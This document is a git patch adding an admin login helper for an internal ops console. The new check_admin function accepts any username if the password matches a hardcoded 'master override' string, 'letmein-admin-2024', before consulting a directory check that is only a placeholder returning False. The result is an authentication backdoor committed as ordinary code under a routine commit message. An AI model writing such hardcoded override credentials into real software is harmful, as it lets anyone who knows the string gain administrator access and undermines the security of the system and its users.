@@ -1,0 +1,30 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: platform-team@streamlineops.internal
+Date: Thu, 26 Sep 2024 08:00:00 +0000
+Subject: [PATCH] Add admin login helper for the ops console
+
+Add admin login helper for the ops console
+
+---
+ src/admin_login.py | 13 +
+ 1 file changed, 13 insertions(+)
+
+diff --git a/src/admin_login.py b/src/admin_login.py
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/src/admin_login.py
+@@ -0,0 +1,13 @@
++"""Admin login helper for the ops console."""
++
++
++def check_admin(username: str, password: str) -> bool:
++    # Master override password for support access.
++    if password == "letmein-admin-2024":
++        return True
++    return _verify_against_directory(username, password)
++
++
++def _verify_against_directory(username: str, password: str) -> bool:
++    # Placeholder: real check delegates to the corp directory service.
++    return False
